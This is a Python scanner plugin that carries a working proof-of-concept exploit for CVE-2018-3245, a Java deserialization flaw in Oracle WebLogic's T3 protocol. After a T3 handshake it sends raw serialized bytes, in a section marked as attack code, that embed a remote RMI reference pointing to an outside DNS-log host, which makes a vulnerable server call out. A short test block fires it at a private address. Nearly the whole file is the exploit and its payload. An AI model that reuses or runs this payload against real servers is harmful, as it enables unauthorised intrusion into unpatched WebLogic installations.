#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2018-3245，不是很稳定要多试几次
# updated 2019/10/23
#

import pathlib
import socket
import struct
import sys
import time
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server WLS Core Components Access Control',
            'catalog': 'CVE-2018-3245',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['t3'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, timeout=5) -> Tuple[bool, Any]:
        # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
        try:
            self.tcp.connect()
        except socket.timeout:
            return False, 'connection timeout.'
        except ConnectionRefusedError:
            return False, 'connection refuse.'
        # t3 handshake
        err, _ = self.tcp.rq(b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n', timeout=timeout, delay=0.1)

        # build t3 request object
        data = (
            b'''\x00\x00\x05\xc3\x01e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00j\x00\x00\xea`\x00\x00\x00\x19\x00\x93{HJV\xfaJwvf\xf5\x81\xda\xa4\xf5\xb9\x0e*\xeb\xfc`t\x99\xb4\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00pppppp\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x06\x00p\x06\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x04L\x00\nimplVendorq\x00~\x00\x04L\x00\x0bimplVersionq\x00~\x00\x04xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x06I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\x08I\x00\x05majorI\x00\x05minorI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwP!\x00\x00\x00\x00\x00\x00\x00\x00\x00\r192.168.1.227\x00\x12WIN-AGDMVQUB1T6.eh\x834\x8c\xd6\x00\x00\x00\x07\x00\x00'''
            + url.i_port.to_bytes(2, 'big')
            + b'''\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xffx\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpw \x01\x14\xdcB\xbd\x07\x1aw'\x00\r242.214.1.254a\x86=\x1d\x00\x00\x00\x00x'''
        )
        err, _ = self.tcp.rq(data, timeout=timeout)
        if err:
            return False, err

        # send evil object data
        data = b'\x00\x00\t\xf3\x01e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00q\x00\x00\xea`\x00\x00\x00\x18C.\xc6\xa2\xa69\x85\xb5\xaf}c\xe6C\x83\xf4*m\x92\xc9\xe9\xaf\x0f\x94r\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00pppppp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00p\x06\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00'
        # -------- attack code start --------
        data += b'\xac\xed\x00\x05sr\x00/com.sun.jndi.rmi.registry.ReferenceWrapper_Stub\x00\x00\x00\x00\x00\x00\x00\x02\x02\x00\x00xr\x00\x1ajava.rmi.server.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\x00\x00xr\x00\x1cjava.rmi.server.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\x00\x00xpw9\x00\nUnicastRef\x00\x10d02zmx.ceye.io\x00\x00\x00P\x00\x00\x00\x00\x13\x8e\xf9\xd2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x'
        # --------- attack code end ---------
        data += b'\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x07I\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwF!\x00\x00\x00\x00\x00\x00\x00\x00\x00\t127.0.1.1\x00\x0bus-l-breens\xa5<\xaf\xf1\x00\x00\x00\x07\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpw\x1d\x01\x81@\x12\x814\xbfBv\x00\t127.0.1.1\xa5<\xaf\xf1\x00\x00\x00\x00\x00x'
        payload = (len(data) + 4).to_bytes(4, 'big') + data
        err, b_response = self.tcp.rq(payload, timeout=timeout)
        if err:
            return False, err
        return b_response != b'', b_response[:30]


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
